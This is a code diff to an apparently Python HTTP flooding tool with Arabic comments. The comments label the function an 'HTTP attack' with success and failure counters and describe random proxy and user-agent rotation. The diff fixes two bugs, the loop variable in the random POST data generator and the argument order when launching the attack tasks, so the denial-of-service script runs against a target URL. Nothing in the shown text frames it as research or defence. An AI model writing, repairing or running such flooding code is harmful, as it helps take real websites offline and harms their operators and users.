@@ -29,7 +29,7 @@ ua = UserAgent()
 # توليد بيانات POST عشوائية
 def random_post_data(length=10):
     letters = string.ascii_letters + string.digits
-    return {f'param_{i}': ''.join(random.choice(letters) for i in range(length)) for i in range(1, 4)}
+    return {f'param_{i}': ''.join(random.choice(letters) for _ in range(length)) for i in range(1, 4)}
 
 # هجوم HTTP مع عداد للطلبات الناجحة والفاشلة
 async def http_attack(target, proxy=None, method="GET", headers=None, success_counter=None, failure_counter=None):
@@ -59,7 +59,7 @@ async def main(url, threads, proxies, method, use_proxies):
     tasks = []
     for _ in range(threads):
         proxy = random.choice(proxies) if use_proxies else None  # اختيار بروكسي عشوائي إذا كان مفعلًا
-        tasks.append(asyncio.create_task(http_attack(url, proxy, method, success_counter, failure_counter)))
+        tasks.append(asyncio.create_task(http_attack(url, proxy, method, None, success_counter, failure_counter)))
     await asyncio.gather(*tasks)
 
     # تقرير نهائي
